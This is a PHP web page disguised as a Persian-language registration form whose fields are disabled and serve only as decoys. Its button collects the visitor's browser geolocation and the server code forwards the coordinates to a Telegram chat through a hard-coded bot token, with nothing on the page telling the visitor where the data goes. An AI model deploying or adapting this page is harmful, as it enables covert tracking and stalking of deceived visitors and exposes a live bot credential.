<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = json_decode(file_get_contents("php://input"), true);

    if (!isset($data["latitude"]) || !isset($data["longitude"])) {
        echo json_encode(["status" => "error", "message" => "Invalid input"]);
        exit;
    }

    $lat = $data["latitude"];
    $lon = $data["longitude"];

    $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";
    $chat_id = "-1002570608346";

    $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
        "chat_id" => $chat_id,
        "latitude" => $lat,
        "longitude" => $lon
    ]);

    file_get_contents($url);

    echo json_encode(["status" => "ok"]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>فرم ثبت اطلاعات</title>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .form-container {
      background-color: #ffffff;
      padding: 35px 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 340px;
    }

    .form-container h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
    }

    input[type="text"], input[type="email"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    button {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    #status {
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>فرم ثبت اطلاعات</h2>
    <input type="text" placeholder="نام کامل" disabled>
    <input type="email" placeholder="ایمیل" disabled>
    <input type="password" placeholder="رمز عبور" disabled>
    <button id="sendBtn">ثبت اطلاعات</button>
    <div id="status"></div>
  </div>

  <script>
    document.getElementById("sendBtn").addEventListener("click", function () {
      const statusEl = document.getElementById("status");
      statusEl.innerText = "";

      if (!navigator.geolocation) {
        statusEl.innerText = "مرورگر موقعیت مکانی را پشتیبانی نمی‌کند.";
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        fetch("", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        })
        .then(res => res.json())
        .then(data => {
          if (data.status === "ok") {
            statusEl.innerText = "اطلاعات با موفقیت ثبت شد!";
          } else {
            statusEl.innerText = "خطا: " + data.message;
          }
        })
        .catch(() => {
          statusEl.innerText = "خطا در ارسال اطلاعات.";
        });
      }, () => {
        statusEl.innerText = "اجازه دسترسی به موقعیت مکانی داده نشد.";
      });
    });
  </script>
</body>
</html>
